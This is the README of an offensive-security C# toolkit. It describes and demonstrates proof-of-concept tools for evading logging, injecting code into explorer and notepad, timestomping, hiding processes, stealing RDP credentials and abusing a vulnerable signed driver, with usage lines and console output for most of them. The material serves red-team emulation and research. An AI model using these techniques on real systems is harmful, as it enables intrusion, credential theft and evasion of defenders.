# Sharp-Suite

The king is dead, long live the king. I am starting a new repo with code samples in C#. My heart is still with PowerShell <3, lets face it using in-line C# in PowerShell is a much nicer experience than actually using C#! However, threat emulation has to evolve over time and so does the tooling.

## Pwn?

### SwampThing

SwampThing lets you to spoof process command line args (x32/64). Essentially you create a process in a suspended state, rewrite the PEB, resume and finally revert the PEB. The end result is that logging infrastructure will record the fake command line args instead of the real ones. Think for example about launching a wmic xsl stylesheet for code execution but faking an innocuous wmic command.

```
C:\>SwampThing.exe -l C:\Windows\System32\notepad.exe -f C:\aaa.txt -r C:\bbb.txt
      /
     :;                \
     |l      _____     |;
     `8o __-~     ~\   d|     Swamp
      "88p;.  -._\_;.oP         Thing
       `>,% (\  (\./)8"
      ,;%%%:  ./V^^^V'
;;;,-::::::'_::\   ||\
8888oooooo.  :\`^^^/,,~--._
 oo.8888888888:`((( o.ooo888
   `o`88888888b` )) 888b8888
     b`888888888;(.,"888b888\
....  b`8888888:::::.`8888.
 `:::. `:::OOO:::::::.`OO' ;
   `.      "``::::::''.'        ~ b33f ~

[>] CreateProcess -> Suspended
[+] PE Arch                       : 64-bit
[+] Process Id                    : 10568
[+] PEB Base                      : 0xA3C2431000
[+] RTL_USER_PROCESS_PARAMETERS   : 0x20DA9760000
[+] CommandLine                   : 0x20DA9760070
[+] UNICODE_STRING |-> Len        : 66
                   |-> MaxLen     : 68
                   |-> pBuff      : 0x20DA9760658

[>] Rewrite -> RTL_USER_PROCESS_PARAMETERS
[+] RtlCreateProcessParametersEx  : 0xEAADF0
[+] RemoteAlloc                   : 0xEA0000
[+] Size                          : 1776
[?] Success, sleeping 500ms..

[>] Reverting RTL_USER_PROCESS_PARAMETERS
[+] Local UNICODE_STRING          : 0xEBC4D0
[+] Remote UNICODE_STRING.Buffer  : 0x20DA9B10000
[+] pRTL_USER_PROCESS_PARAMETERS  : 0x20DA9870FE0
[?] Success rewrote Len, MaxLen, Buffer..
```

### DesertNut

DesertNut is a proof-of-concept for code injection using subclassed window callbacks (more commonly known as PROPagate). The pertinent part here is that this does not use any suspect thread creation API's, instead as implied it hijacks window callbacks. DesertNut includes two flags: "-l" to list all potential properties that could be hijacked and "-i" to inject shellcode into explorer and execute notepad. Note that this POC is only designed for x64 (tested on Win10 RS5 & Win7) since it requires custom shellcode with a specific callback function prototype. For further details please see [this post](http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/) by Hexacorn and [this post](https://modexp.wordpress.com/2018/08/23/process-injection-propagate/) by modexp.

```
C:\> DesertNut.exe -i
           ,                        '           .        '        ,
   .            .        '       .         ,
                                                   .       '     +
       +          .-'''''-.
                .'         `.   +     .     ________||
       ___     :             :     |       /        ||  .     '___
  ____/   \   :               :   ||.    _/      || ||\_______/   \
 /         \  :      _/|      :   `|| __/      ,.|| ||             \
/  ,   '  . \  :   =/_/      :     |'_______     || ||  ||   .      \
    |        \__`._/ |     .'   ___|        \__   \\||  ||...    ,   \
   l|,   '   (   /  ,|...-'        \   '   ,     __\||_//___
 ___|____     \_/^\/||__    ,    .  ,__             ||//    \    .  ,
           _/~  `''~`'` \_           ''(       ....,||/       '
 ..,...  __/  -'/  `-._ `\_\__        | \           ||  _______   .
              '`  `\   \  \-.\        /(_1_,..      || /
                                            ______/''''

[+] Searching for Subclass property..
[>] PID: 10928, ImageName: explorer
    |-> ParentClassName: Progman, ChildClassName: SHELLDLL_DefView
[+] Duplicating Subclass header..
[>] hProc: 0x378
[>] hProperty: 0x6B14DD0
    |-> uRefs: 2, uAlloc: 3, uCleanup: 0
    |-> dwThreadId: 5804, pFrameCur: 0
    |-> pfnSubclass: 0x7FFA20E42280 --> comctl32!CallOriginalWndProc (?)
    |-> uIdSubclass: 0, dwRefData: 0x7FFA2E4C07D0
[+] Allocating remote shellcode..
    |-> Sc Len: 344
    |-> Sc Address: 0x3220000
[+] Rewriting local SUBCLASS_HEADER..
[+] Allocating remote SUBCLASS_HEADER..
    |-> Subclass header Len: 48
    |-> Subclass header Address: 0x3260000
[+] Updating original UxSubclassInfo subclass procedure..
[+] Trigger remote shellcode --> notepad..
[+] Restoring original UxSubclassInfo subclass procedure..
[+] Freeing remote SUBCLASS_HEADER & shellcode..

C:\> DesertNut.exe -l
           ,                        '           .        '        ,
   .            .        '       .         ,
                                                   .       '     +
       +          .-'''''-.
                .'         `.   +     .     ________||
       ___     :             :     |       /        ||  .     '___
  ____/   \   :               :   ||.    _/      || ||\_______/   \
 /         \  :      _/|      :   `|| __/      ,.|| ||             \
/  ,   '  . \  :   =/_/      :     |'_______     || ||  ||   .      \
    |        \__`._/ |     .'   ___|        \__   \\||  ||...    ,   \
   l|,   '   (   /  ,|...-'        \   '   ,     __\||_//___
 ___|____     \_/^\/||__    ,    .  ,__             ||//    \    .  ,
           _/~  `''~`'` \_           ''(       ....,||/       '
 ..,...  __/  -'/  `-._ `\_\__        | \           ||  _______   .
              '`  `\   \  \-.\        /(_1_,..      || /
                                            ______/''''


[+] Subclassed Window Properties
[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x1BC84BF0, hParentWnd: 0xA0710, hChildWnd: 0x100650
    |-> ParentClassName: Shell_TrayWnd, ChildClassName: Start

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x1BC84C70, hParentWnd: 0xA0710, hChildWnd: 0x1C064C
    |-> ParentClassName: Shell_TrayWnd, ChildClassName: TrayDummySearchControl

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A64F0, hParentWnd: 0x1C064C, hChildWnd: 0x800E8
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: Button

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A58F0, hParentWnd: 0x1C064C, hChildWnd: 0x1504A4
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: Static

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A5870, hParentWnd: 0x1C064C, hChildWnd: 0x110814
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: ToolbarWindow32

[...Snipped...]
```

### WindfarmDynamite

WindfarmDynamite is a proof-of-concept for code injection using the Windows Notification Facility (WNF). Of interest here is that this avoids suspect thread orchestration APIs (like CreateRemoteThread). The POC overwrites a process level WNF subscription callback which can be triggered by signaling a WNF state name. There currently exists little functionality in Windows to monitor WNF activity. WindfarmDynamite includes two flags: "-l PID" to list all WNF subscriptions for a specific process and "-i" to inject shellcode into explorer and execute notepad. Note that this POC is only designed for x64 (tested on Win10). For further details please see [this talk](https://www.youtube.com/watch?v=MybmgE95weo) by Alex Ionescu & Gabrielle Viala and [this post](https://modexp.wordpress.com/2019/06/15/4083/) by modexp.

```
C:\> WindfarmDynamite.exe -i
.  ..  ..___           .__                 ,
|  ||\ |[__  _.._.._ _ |  \  .._  _.._ _ *-+- _
|/\|| \||   (_][  [ | )|__/\_|[ )(_][ | )| | (/,
                           ._|

[+] Validating Process..
[>] PID: 996, ImageName: explorer
    |-> hProc: 632, Arch: x64

[+] Leaking local WNF_SUBSCRIPTION_TABLE..
[>] TblPtr: 0x7FFD99CB5FA8, NtdllRVA: 1335208

[+] Remote WNF_SUBSCRIPTION_TABLE lookup..
[>] rNtdllBase: 0x7FFD99B70000, rWNFSubTable: 0x5A9120
    |-> NameTable Flink: 0x4A6CA10, NameTable Blink: 0x5BB050

[+] Finding remote subscription -> WNF_SHEL_LOGON_COMPLETE
[>] SubscriptionId: 0xB89, State Name: WNF_SHEL_LOGON_COMPLETE
    |-> WNF_USER_SUBSCRIPTION: 0x49C8E38
    |-> Callback: 0x7FFD82F58C60 => twinui.dll!DllCanUnloadNow
    |-> Context: 0x2A12F40 => N/A

[+] Allocating remote shellcode..
[>] Sc Len: 344
[>] Sc Address: 0x27A0000

[+] Rewriting WNF subscription callback pointer..
[+] NtUpdateWnfStateData -> Trigger shellcode
[+] Restoring WNF subscription callback pointer & deallocating shellcode..

C:\> WindfarmDynamite.exe -l 4132
.  ..  ..___           .__                 ,
|  ||\ |[__  _.._.._ _ |  \  .._  _.._ _ *-+- _
|/\|| \||   (_][  [ | )|__/\_|[ )(_][ | )| | (/,
                           ._|

[+] Validating Process..
[>] PID: 4132, ImageName: vmtoolsd
    |-> hProc: 640, Arch: x64

[+] Leaking local WNF_SUBSCRIPTION_TABLE..
[>] TblPtr: 0x7FFD99CB5FA8, NtdllRVA: 1335208

[+] Remote WNF_SUBSCRIPTION_TABLE lookup..
[>] rNtdllBase: 0x7FFD99B70000, rWNFSubTable: 0x56B2F0
    |-> NameTable Flink: 0x58EA30, NameTable Blink: 0x58F070

[+] Reading remote WNF subscriptions..
[>] SubscriptionId: 0x931, State Name: WNF_ENTR_EDPENFORCEMENTLEVEL_POLICY_VALUE_CHANGED
    |-> WNF_USER_SUBSCRIPTION: 0x4BB5B88
    |-> Callback: 0x7FFD87505DF0 => edputil.dll!EdpIsUIPolicyEvaluationEnabledForThread
    |-> Context: 0x0 => N/A

[>] SubscriptionId: 0x8FA, State Name: WNF_DX_MODE_CHANGE_NOTIFICATION
    |-> WNF_USER_SUBSCRIPTION: 0x5B9658
    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
    |-> Context: 0xA1ECB0 => N/A

[>] SubscriptionId: 0x8F9, State Name: WNF_DX_MONITOR_CHANGE_NOTIFICATION
    |-> WNF_USER_SUBSCRIPTION: 0x5B9708
    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
    |-> Context: 0xA1ECB0 => N/A

[>] SubscriptionId: 0x8F8, State Name: WNF_SPI_LOGICALDPIOVERRIDE
    |-> WNF_USER_SUBSCRIPTION: 0x5BA368
    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
    |-> Context: 0xA1ECB0 => N/A

[>] SubscriptionId: 0x8F4, State Name: WNF_RPCF_FWMAN_RUNNING
    |-> WNF_USER_SUBSCRIPTION: 0x58F828
    |-> Callback: 0x7FFD98610980 => rpcrt4.dll!NdrTypeSize
    |-> Context: 0x0 => N/A
```

### MaceTrap

MaceTrap is a proof-of-concept for time stomping using SetFileTime. MaceTrap allows you to set the CreationTime / LastAccessTime / LastWriteTime for arbitrary files and folders. These elements can be changed individually, in bulk or can be duplicated from an existing file or folder. Time permitting I will update MaceTrap to include comprehensive PE compile time stomping as well (header, import table, export table, debug directory, resources and fixing up the checksum).

```
C:\> MaceTrap.exe

    /-|-\   MACE
   [++++||<<>><<>>|===|+
    \-|-/    TRAP             ~b33f~


 >--~~--> Args? <--~~--<

-l (-List)        List FileTime information for a file or folder
-s (-Set)         Set FileTime information for a file or folder
-d (-Duplicate)   Duplicate FileTime information from a file or folder
-t (Time)         String DateTime representation; requires quotes if it contains spaces. All
                  undefined elements are set randomly (YYYY-MM-DD is required!):
                    =>  1999-10-20
                    => "2001-01-02 14:13"
                    => "2019-02-19 01:01:01.111"
-c (-Create)      Boolean flag, overwrite CreationTime
-a (-Access)      Boolean flag, overwrite LastAccessTime
-w (-Write)       Boolean flag, overwrite LastWriteTime

 >--~~--> Usage? <--~~--<

# List all FileTime elements
MaceTrap.exe -l C:\Windows\System32\kernel32.dll
# TimeStomp all FileTime elements
MaceTrap.exe -s C:\Some\Target\file.folder -t "2019-02-19 01:01:01,111"
# TimeStomp CreationTime & LastWriteTime; here HH:MM:SS,MS are randomized
MaceTrap.exe -s C:\Some\Target\file.folder -t 1999-09-09 -c -w
# TimeStomp a file/folder by duplicating the FileTime information from an existing file/folder
MaceTrap.exe -s C:\Some\Target\file.folder -d C:\Windows\System32\kernel32.dll
```

### UrbanBishop

UrbanBishop is a small POC I wrote while I was testing [Donut](https://github.com/TheWover/donut). If you haven't seen or used Donut I highly recommend you have a look at the magic TheWover & odzhan are doing there! This POC creates a local RW section in UrbanBishop and then maps that section as RX into a remote process. Once the shared section has been established the shellcode is written to the local section which then automatically propagates to the remote process. For execution UrbanBishop creates a remote suspended thread (start address is set to ntdll!RtlExitUserThread) and queues and APC on that thread, once resumed with NtAlertResumeThread the shellcode executes and the thread exits gracefully on completion. The POC can be adapted for inline shellcode but that was not my use case. I tested UrbanBishop on x64 Win10/Win7.

```
C:\> UrbanBishop.exe -i 3380 -p C:\Users\b33f\Desktop\sc.bin -c
   _O       _____     _
  / //\    |  |  |___| |_ ___ ___
 {     }   |  |  |  _| . | .'|   |
  \___/    |_____|_| |___|__,|_|_|
  (___)
   |_|          _____ _     _
  /   \        | __  |_|___| |_ ___ ___
 (_____)       | __ -| |_ -|   | . | . |
(_______)      |_____|_|___|_|_|___|  _|
/_______\                          |_|
                       ~b33f~

|--------
| Process    : notepad
| Handle     : 828
| Is x32     : False
| Sc binpath : C:\Users\b33f\Desktop\sc.bin
|--------

[>] Creating local section..
    |-> hSection: 0x338
    |-> Size: 31361
    |-> pBase: 0x2470000
[>] Map RX section to remote proc..
    |-> pRemoteBase: 0x16967970000
[>] Write shellcode to local section..
    |-> Size: 31361
[>] Seek export offset..
    |-> pRemoteNtDllBase: 0x7FFDE64A0000
    |-> LdrGetDllHandle OK
    |-> RtlExitUserThread: 0x7FFDE650CF10
    |-> Offset: 0x6CF10
[>] NtCreateThreadEx -> RtlExitUserThread <- Suspended..
    |-> Success
[>] Set APC trigger & resume thread..
    |-> NtQueueApcThread
    |-> NtAlertResumeThread
[>] Waiting for payload to finish..
    |-> Thread exit status -> 0
    |-> NtUnmapViewOfSection
```

### AtomicBird

AtmoicBird, is a crude POC to demo the use of [EasyHook](https://easyhook.github.io/) in .Net payloads combined with [Costura](https://github.com/Fody/Costura) to pack resources into a single module. AtomicBird has two functions, (1) Hook MessageBoxA => print to console / modify parameters => unhook and (2) Hook NtQuerySystemInformation->SystemProcessInformation, search the linked list of SYSTEM_PROCESS_INFORMATION Structs to find powershell processes and unlink them. The second function requires that you inject the .Net PE into a process that uses NtQuerySystemInformation (Process Explorer was used for testing), you can do that with execute-assembly or with donut by generating shellcode. AtmoicBird was only tested on x64 Win10.

```

              .---.        .-----------
             /     \  __  /    ------
            / /     \(  )/    -----  Atomic
           //////   ' \/ `   ---       Bird
          //// / // :    : ---
         // /   /  /`    '--
        //          //..\\      ~b33f~
               ====UU====UU====
                   '//||\\`
                     ''``
Called ==> SystemProcessInformation
Called ==> SystemProcessInformation
Called ==> SystemProcessInformation
Called ==> SystemProcessInformation
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
[!] Found Powershell => rewriting linked list

[...Snipped...]
```

### RemoteViewing

RemoteViewing, is quick POC to demo RDP credential theft through API hooking using [EasyHook](https://easyhook.github.io/) for .Net payloads combined with [Costura](https://github.com/Fody/Costura) to pack resources into a single module. This is adapted from a post by [@0x09AL](https://twitter.com/0x09AL) that you can read [here](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/). To use this you have to compile RemoteViewing and then turn it into shellcode with [Donut](https://github.com/TheWover/donut) after which you have to inject that shellcode into mstsc. RemoteViewing will RC2 encrypt any credentials it captures and write them to disk. You can then use Clairvoyant to decrypt the file in memory, read out the results and delete the file.

### Londor

Londor is a small toolkit which wraps [frida-clr](https://github.com/frida/frida). I initially wanted to create a tool which would allow you to generate DynamoRIO coverage files but I also ported some code from [Fermion](https://github.com/FuzzySecurity/Fermion) to provide some more generic JScript injection capabilities. Note: There are some color palette bugs in Londor that I left unfixed (not my problem & does not affect usability) so if you use it in different terminal flavors you will see some wacky color combos. I may return to this at some point when I have ∆-freeTime.

```
C:\> Londor.exe
    __              _
   |  |   ___ ___ _| |___ ___
   |  |__| . |   | . | . |  _|
   |_____|___|_|_|___|___|_|

                         ~b33f


  >--~~--> Args? <--~~--<

 --help   (-h)    Show this help message.
 --type   (-t)    Instrumentation type: Coverage, Script.
 --out    (-o)    Full output path for DRCOV file.
 --path   (-p)    Full path to JS script.
 --pid    (-pid)  PID of the process to attach to.
 --name   (-n)    Substring name of process to attach to.
 --start  (-s)    Full path to binary to launch.
 --args   (-a)    Args to pass to binary.

  >--~~--> Usage? <--~~--<


 # Generate coverage information for a process
 Londor.exe -t Coverage -pid 123 -o C:\Some\Out\Path.drcov
 Londor.exe -t Coverage -n notepad -o C:\Some\Out\Path.drcov
 Londor.exe -t Coverage -s C:\Some\Proc\bin.exe -a SomeOrNoArgs -o C:\Some\Out\Path.drcov

 # Inject JS script into process
 Londor.exe -t Script -pid 123 -p C:\Some\Path\To\Script.js
 Londor.exe -t Script -n notepad -p C:\Some\Path\To\Script.js
 Londor.exe -t Script -s C:\Some\Proc\bin.exe -a SomeOrNoArgs -p C:\Some\Path\To\Script.js
 

C:\> Londor.exe -t Coverage -s "C:\Windows\System32\notepad.exe" -o C:\Users\b33f\Desktop\test.drcov -a "C:\Users\b33f\Desktop\bla.txt"
    __              _
   |  |   ___ ___ _| |___ ___
   |  |__| . |   | . | . |  _|
   |_____|___|_|_|___|___|_|

                         ~b33f


[>] Spawning process for coverage..
    |-> PID: 5260; Path: C:\Windows\System32\notepad.exe
    |-> Script loaded

[*] Press ctrl-c to detach..

[+] Block trace Length: 107160
    |-> BBS slice: 13395; Total BBS: 13395
[+] Block trace Length: 18456
    |-> BBS slice: 2307; Total BBS: 15702
[+] Block trace Length: 76032
    |-> BBS slice: 9504; Total BBS: 25206
[+] Block trace Length: 22216
    |-> BBS slice: 2777; Total BBS: 27983
[+] Block trace Length: 20248
    |-> BBS slice: 2531; Total BBS: 30514
[+] Block trace Length: 32
    |-> BBS slice: 4; Total BBS: 30518

[?] Unloading hooks, please wait..
    |-> Wrote trace data to file
```

### VirtToPhys

VirtToPhys is a small POC to demonstrate how you can calculate the physical address for a kernel virtual address when exploiting driver bugs that allow you to map physical memory. VirtToPhys uses MsIo.sys, a WHQL signed driver that gives you colorful lights on your RAM (?lolwut), [CVE-2019-18845](https://github.com/active-labs/Advisories/blob/master/2019/ACTIVE-2019-012.md). Hat tips and full credits to [@UlfFrisk](https://twitter.com/UlfFrisk) for his very insightful [MemProcFS](https://github.com/ufrisk/MemProcFS) project and [@hFireF0X](https://twitter.com/hFireF0X) for [KDU](https://github.com/hfiref0x/KDU).

```
C:\> VirtToPhys.exe -l
 _   _ _      _ _____    ______ _
| | | (_)    | |_   _|   | ___ \ |
| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
 \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
                                       __/ |
                                      |___/

                                         ~b33f
[+] Running as Administrator
[>] Executing on x64
[?] Loading MsIo driver..
[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
    |-> Success
[>] Driver Nt path: \??\C:\Windows\System32\MsIo64.sys
[>] Driver registration: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsIoTest
[?] NtLoadDriver -> Success
[+] Driver load: OK

C:\> VirtToPhys.exe -v 0xffffd20fc9a5f440
 _   _ _      _ _____    ______ _
| | | (_)    | |_   _|   | ___ \ |
| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
 \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
                                       __/ |
                                      |___/

                                         ~b33f
[+] Running as Administrator
[>] Executing on x64
[*] MsIO driver handle: 604
[?] Leaking PML4..
[+] PML4 in lowstub --> 1AB000
[?] Converting VA -> PA
    |-> PhysAddress: 7E25F440

C:\> VirtToPhys.exe -u
 _   _ _      _ _____    ______ _
| | | (_)    | |_   _|   | ___ \ |
| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
 \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
                                       __/ |
                                      |___/

                                         ~b33f
[+] Running as Administrator
[>] Executing on x64
[?] UnLoading MsIo driver..
[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
    |-> Success
[+] NtUnloadDriver -> Success
[+] Driver deleted from disk
[+] Driver service artifacts deleted
[?] Driver unload: OK
```

### DiscerningFinch

DiscerningFinch is ... discerning! FinchGen lets you create an encrypted templated which you can copy/paste into DiscerningFinch. At runtime DiscerningFinch collects [an array of OS specific string constants](https://github.com/FuzzySecurity/Sharp-Suite/blob/master/DiscerningFinch/DiscerningFinch/DiscerningFinch/Helper.cs#L15) and then attempts to use those to brute-force decrypt the inner binary. If it succeeds it loads the inner binary into memory passing along any command line arguments that may exists. If it fails, it prints out a .NET-looking error message as feedback. Take note that the .NET version of the inner binary should be the same as that of DiscerningFinch, compile accordingly.

```
C:\> FinchGen.exe -p C:\Some\Path\netApp.exe -k "NVIDIA Corporation" -o C:\Some\Path\keyed_template.cs

...

C:\> DiscerningFinch_badKey.exe 111 222 zzz
System.IndexOutOfRangeException: Finch index was outside the bounds of the array
    at System.Number.StringToNumber(String str, NumberStyles options, NumberBuffer& number, NumberInfo info)
    at System.Number.ParseInt32(String s, NumberStyles style, NumberFormatInfo info)
    at System.Int32.Parse(String s)

C:\> DiscerningFinch_goodKey.exe 111 222 zzz
[+] Hello There!
[?] Got 3 cmdline args..
    |_ 111
    |_ 222
    |_ zzz
```

### Canary

Canary is a small DIY extension to [SharpChrome](https://github.com/GhostPack/SharpDPAPI). It lets you pull browser history for Chrome or the new Chromium Edge. Results are orderd by visit_count and you can pull all data or use the "-l" flag to pull only the last X days. Most of the boilerplate is ripped out of SharpChrome and can be added there easily if someone wants to make a PR for that.

```
C:\> Canary.exe -h
 __
/   _ __  _  __ \/
\__(_|| |(_| |  /

  -h(--Help)       Show this help message.
  -l(--Limit)      Limit results to the past x days.
  -b(--Browser)    Chrome (default) or Edge (new chromium Edge).

C:\> Canary.exe -b edge -l 3

[...Snipped...]

URL             : https://microsoftedgewelcome.microsoft.com/en-us/
title           : Microsoft Edge
visit_count     : 2
last_visit_time : 22/09/2020 12:04:07

[...Snipped...]
```

### Reprobate

Reprobate consists of two `cs` files which contain all of the [DynamicInvoke](https://thewover.github.io/Dynamic-Invoke/) functionality and are meant to be plug-and-play for your C# projects. This can be preferable to using a nuget package or whole-sale including [SharpSploit](https://github.com/cobbr/SharpSploit). Eventually I will integrate bubble-sort Syscall ID identification as well to avoid manual ntdll mapping/enumeration.

For further details check out => [BlueHatIL 2020: Staying # and Bringing Covert Injection Tradecraft to .NET](https://github.com/FuzzySecurity/BlueHatIL-2020)

### Melkor

Melkor is a simplistic POC. Melkor is able to read `.Net assemblies` and encrypt them in memory using `DPAPI` with the `CRYPTPROTECT_LOCAL_MACHINE` flag. These assemblies are kept encrypted when they are at rest. On demand Melkor can decrypt the assemblies and execute methods from them in a separate `AppDomain`. Once execution finishes the `AppDomain` is unloaded and only the encrypted assembly remains in memory. This POC is adapted from a TTP I read about in [this](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf) report by ESET where the threat actor `InvisiMole` used `DPAPI` to encrypt part of their kit so it could only be decrypted/executed on that host.

With some proper bookkeeping and a code rework Melkor could be adapted to serve as a plugin interface for an implant. The LP could send assemblies (aka capabilities) to the implant which keeps them encrypted in memory. On demand, the interface could `decrypt -> execute in new AppDomain -> destroy AppDomain -> clean up`. This architecture would also allow the LP to perform an update of a capability that already exists in the implant.

```
C:\> Melkor.exe
   _____         .__   __
  /     \   ____ |  | |  | _____________
 /  \ /  \_/ __ \|  | |  |/ /  _ \_  __ \
/    Y    \  ___/|  |_|    <  <_> )  | \/
\____|__  /\___  >____/__|_ \____/|__|
        \/     \/          \/

[>] Reading assembly as Byte[]
[>] DPAPI CryptProtectData -> assembly[]
    |_ Success
    |_ pCrypto : 0x8861F0
    |_ iSize   : 4850

[?] Press enter to continue..

[>] DPAPI CryptUnprotectData -> assembly[] copy
    |_ Success
[>] Create new AppDomain and invoke module through proxy..
[>] Executing in AppDomain -> Angband
[+] Angband Loaded Modules
    |_ mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
    |_ Melkor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
    |_ demoModule, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
[+] Calling demoModule --> dothething

[?] Press enter to continue..

[>] Unloading AppDomain
[>] Freeing CryptUnprotectData

[?] Press enter to exit..
```

### PickmansModel

`PickmansModel` is a small POC which demonstrates robust encryption negotiation using Elliptic-Curve Diffie–Hellman (ECDH) key exchange. In this instance the exchange is negotiated over a named pipe (server & client), it also supports traffic across hosts. The transport itself is incidental, you can rip the code out and put it in some other protocol if you like. I mostly post it as a code reference.

The main workflow is as follows:
- The server and the client initialize `ECDiffieHellmanCng` using `SHA256` as the hashing algorithm.
- The server and the client have a `static AES key` they know (provided on the command line in this case).
- They both encrypt their `ECDiffieHellmanCng public keys` with the static AES password and exchange them. This is not a connection security feature; it is used as an auth feature. Only a client that knows the AES key the server uses will be able to perform the key exchange.
- Both the server and the client `DeriveKeyMaterial`. They now share a secret byte array. This array will be different every time the connection is established regardless of the initial exchange.
- This secret is then used to construct a `new AES Key and IV` which is then used for ongoing communication.


```
C:\> PickmansModel.exe -p testPipe -a Hello123!

[?] Connected to pipe on : testPipe
[+] ECDiffieHellmanCng initialized..
    |_ Hash Algorithm : SHA256
    |_ Public Key :
00000000   45 43 4B 35 42 00 00 00  00 C7 56 D8 8F E7 05 93   ECK5B····ÇVØ?ç·?
00000010   06 03 86 7C D1 2C E0 6F  52 43 C2 D5 6D 25 58 93   ··?|Ñ,àoRCÂÕm%X?
00000020   31 A1 14 2E E9 43 A5 19  32 F8 98 4E 6D C7 54 90   1¡·.éC¥·2ø?NmÇT?
00000030   CE 81 4B CD 8C CF F8 0E  2C 45 FA 2E 55 95 40 3C   Î?KÍ?Ïø·,Eú.U?@<
00000040   A1 BF F8 B7 8C 22 5B 61  F9 4A 01 9E 27 5D 7F 30   ¡¿ø·?"[aùJ·?']⌂0
00000050   86 28 6C 0D E3 39 8A 62  14 8C 79 36 66 2A 2E 1C   ?(l·ã9?b·?y6f*.·
00000060   32 AC 7A 3F E3 A5 F8 73  72 D6 F1 15 9F 0F 1C 7B   2¬z?ã¥øsrÖñ·?··{
00000070   45 52 D3 39 C9 29 CC 01  8A 83 DD 15 B6 DA 4C C6   ERÓ9É)Ì·??Ý·¶ÚLÆ
00000080   90 26 D5 42 82 D1 B3 17  31 CA 11 C4               ?&ÕB?Ñ³·1Ê·Ä

[+] Received server ECDH public key
    |_ AES Encrypted Public Key :
00000000   15 BA 7B FC E8 D1 71 A3  7E C2 45 CD DC F0 D2 49   ·º{üèÑq£~ÂEÍÜðÒI
00000010   ED 7B AC 1A E5 2D CD 99  54 2D F4 DB 95 EE CB 94   í{¬·å-Í?T-ôÛ?îË?
00000020   8D 6C E9 5B AE 83 5A D5  F4 77 9C A1 14 75 15 60   ?lé[®?ZÕôw?¡·u·`
00000030   7F C3 6A F7 1C 9B FD 79  BF 41 D0 91 5D D9 0F 72   ⌂Ãj÷·?ýy¿AÐ?]Ù·r
00000040   95 37 6B 9A 9A 96 CA E6  B1 1E 5B 77 C8 AC 66 60   ?7k???Êæ±·[wÈ¬f`
00000050   95 67 A9 47 2A F6 A1 26  17 CF 82 B3 C4 00 A9 38   ?g©G*ö¡&·Ï?³Ä·©8
00000060   BD 8D 6E 1A 16 41 7B B2  7C 82 00 D8 75 8F F1 C7   ½?n··A{²|?·Øu?ñÇ
00000070   4F 36 66 72 04 C9 8D 43  15 52 80 A4 63 77 E9 9E   O6fr·É?C·R?¤cwé?
00000080   59 DA FE 4A 21 78 48 9E  09 C6 91 92 EB 4C FC C5   YÚþJ!xH?·Æ??ëLüÅ

[>] Derived Shared Secret
00000000   49 A1 37 6A EE 69 D7 94  A9 2B 58 BB 10 05 2D C4   I¡7jîi×?©+X»··-Ä
00000010   94 05 84 6E FB 59 C6 9B  75 5E 12 2F 5D C1 A6 DA   ?·?nûYÆ?u^·/]Á¦Ú

[>] Derived Shared IV
00000000   60 AA 25 A9 62 F3 80 4E  94 66 E3 0F 40 0F 25 74   `ª%©bó?N?fã·@·%t

[Client sending] : Well, if you must hear it, I don't know why you shouldn't. Maybe you ought to, anyhow, for you kept writing me like a grieved parent when you heard I'd begun to cut the Art Club and keep away from Pickman.

[Server Received] : You know, there are things that won't do for Newbury Street-things that are out of place here, and that can't be conceived here, anyhow. It's my business to catch the overtones of the soul, and you won't find those in a parvenu set of artificial streets on made land. Back Bay isn't Boston-it isn't anything yet, because it's had no time to pick up memories and attract local spirits. If there are any ghosts here, they're the tame ghosts of a salt marsh and a shallow cove; and I want human ghosts-the ghosts of beings highly organised enough to have looked on hell and known the meaning of what they saw.

[Client Sending] : Pickman had promised to shew me the place, and heaven knows he had done it. He led me out of that tangle of alleys in another direction, it seems, for when we sighted a lamp post we were in a half-familiar street with monotonous rows of mingled tenement blocks and old houses. Charter Street, it turned out to be, but I was too flustered to notice just where we hit it.
```

### TOTP-Gen

`totp-gen` is a small POC which demonstrates time-based one-time password (TOTP) generation in C#. This POC specifically gets `DateTime.UtcNow` and uses that as a `Key` value to initialize `HMACSHA256`. The `HMACSHA256` object is then used to hash a `String` based seed and generate a numeric TOTP value.

This is mostly to be used as a reference for me so I can strip out the generator if needed and integrate it into other tools (e.g., an extra layer of auth for an encrypted comms channel). The only required functions are `generateTOTP` and `validateTOTP` in `hTOTP.cs`.

Notes:
